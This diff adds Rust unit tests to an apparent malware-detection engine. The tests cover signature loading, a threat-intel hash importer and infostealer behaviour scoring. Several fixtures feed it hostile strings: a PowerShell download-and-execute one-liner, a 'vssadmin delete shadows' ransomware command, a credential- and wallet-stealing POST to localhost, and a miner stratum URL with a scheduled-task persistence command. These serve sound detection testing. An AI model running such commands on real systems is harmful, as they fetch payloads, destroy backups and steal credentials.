@@ -326,4 +326,169 @@ mod tests {
         }
         assert_eq!(decision, BehaviorDecision::StopProcess);
     }
+
+    fn repo_root() -> std::path::PathBuf {
+        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+            .parent()
+            .and_then(|path| path.parent())
+            .unwrap()
+            .to_path_buf()
+    }
+
+    fn repo_engine() -> ZentorNativeEngine {
+        let mut config = EngineConfig::from_repo_root(repo_root());
+        config.quarantine_dir = tempfile::tempdir().unwrap().keep();
+        ZentorNativeEngine::initialize(config).unwrap()
+    }
+
+    #[test]
+    fn repo_native_packs_detect_more_than_eicar() {
+        let engine = repo_engine();
+        let status = engine.status();
+        assert!(status.signature_count >= 10);
+        assert!(status.rule_count >= 8);
+        assert!(status.compatibility_engines_disabled_by_default);
+    }
+
+    #[test]
+    fn imported_known_bad_hash_fixture_is_confirmed() {
+        let mut engine = repo_engine();
+        let verdict = engine
+            .scan_bytes_for_test(
+                std::path::PathBuf::from("known-bad-ransomware-fixture.bin"),
+                b"zentor harmless ransomware known bad fixture",
+                ScanActionMode::DetectOnly,
+            )
+            .unwrap();
+        assert_eq!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
+        assert_eq!(verdict.final_verdict.category, ThreatCategory::Ransomware);
+    }
+
+    #[test]
+    fn script_downloader_indicator_becomes_probable() {
+        let mut engine = repo_engine();
+        let bytes = b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.txt'); Start-Process calc.exe";
+        let verdict = engine
+            .scan_bytes_for_test(
+                std::path::PathBuf::from("downloader.ps1"),
+                bytes,
+                ScanActionMode::DetectOnly,
+            )
+            .unwrap();
+        assert_eq!(verdict.final_verdict.category, ThreatCategory::SuspiciousDownloader);
+        assert!(matches!(
+            verdict.final_verdict.verdict,
+            Verdict::Suspicious | Verdict::ProbableMalware
+        ));
+    }
+
+    #[test]
+    fn ransomware_indicator_combination_is_probable() {
+        let mut engine = repo_engine();
+        let bytes = b"your files have been encrypted. decrypt your files. vssadmin delete shadows /all /quiet";
+        let verdict = engine
+            .scan_bytes_for_test(
+                std::path::PathBuf::from("ransom-note-script.ps1"),
+                bytes,
+                ScanActionMode::DetectOnly,
+            )
+            .unwrap();
+        assert_eq!(verdict.final_verdict.category, ThreatCategory::Ransomware);
+        assert!(matches!(
+            verdict.final_verdict.verdict,
+            Verdict::Suspicious | Verdict::ProbableMalware
+        ));
+    }
+
+    #[test]
+    fn infostealer_indicator_combination_is_probable() {
+        let mut engine = repo_engine();
+        let bytes = b"read browser credentials from Login Data and wallet.dat then zip staging archive and POST to http://127.0.0.1/upload";
+        let verdict = engine
+            .scan_bytes_for_test(
+                std::path::PathBuf::from("collector.js"),
+                bytes,
+                ScanActionMode::DetectOnly,
+            )
+            .unwrap();
+        assert_eq!(verdict.final_verdict.category, ThreatCategory::Infostealer);
+        assert!(matches!(
+            verdict.final_verdict.verdict,
+            Verdict::Suspicious | Verdict::ProbableMalware
+        ));
+    }
+
+    #[test]
+    fn miner_pup_indicator_is_review_not_confirmed() {
+        let mut engine = repo_engine();
+        let bytes = b"stratum+tcp://pool.example.invalid schtasks /create /tn worker";
+        let verdict = engine
+            .scan_bytes_for_test(
+                std::path::PathBuf::from("miner-config.ps1"),
+                bytes,
+                ScanActionMode::DetectOnly,
+            )
+            .unwrap();
+        assert_eq!(verdict.final_verdict.category, ThreatCategory::Miner);
+        assert_ne!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
+    }
+
+    #[test]
+    fn threat_intel_hash_importer_builds_signature_pack() {
+        use crate::threat_intel::{
+            import_hash_lines, zentor_pack_builder::indicators_to_signature_pack_json,
+            ThreatIntelSource, ThreatIntelSourceType,
+        };
+        let source = ThreatIntelSource {
+            source_name: "unit-test-feed".to_string(),
+            source_url: None,
+            source_type: ThreatIntelSourceType::TestFixture,
+        };
+        let indicators = import_hash_lines(
+            &source,
+            vec!["84335dd8dd5b649882212609dc875225260878ceadbca9713d4079b7112e3514".to_string()],
+            ThreatCategory::Trojan,
+        )
+        .unwrap();
+        assert_eq!(indicators.len(), 1);
+        let pack_json = indicators_to_signature_pack_json(&indicators, "unit").unwrap();
+        assert!(pack_json.contains("zentor-signature-pack-v1"));
+    }
+
+    #[test]
+    fn threat_intel_importer_rejects_malformed_hash() {
+        use crate::threat_intel::{import_hash_lines, ThreatIntelSource, ThreatIntelSourceType};
+        let source = ThreatIntelSource {
+            source_name: "unit-test-feed".to_string(),
+            source_url: None,
+            source_type: ThreatIntelSourceType::TestFixture,
+        };
+        assert!(import_hash_lines(
+            &source,
+            vec!["not-a-hash".to_string()],
+            ThreatCategory::Trojan,
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn infostealer_behavior_requires_multiple_signals() {
+        let weak = crate::behavior::infostealer_behavior::InfostealerBehaviorEvent {
+            process_id: 10,
+            browser_store_reads: 1,
+            wallet_file_reads: 0,
+            archive_created: false,
+            outbound_network_after_access: false,
+        };
+        assert!(crate::behavior::infostealer_behavior::analyze(&weak).is_none());
+
+        let strong = crate::behavior::infostealer_behavior::InfostealerBehaviorEvent {
+            process_id: 10,
+            browser_store_reads: 3,
+            wallet_file_reads: 1,
+            archive_created: true,
+            outbound_network_after_access: true,
+        };
+        assert!(crate::behavior::infostealer_behavior::analyze(&strong).is_some());
+    }
 }
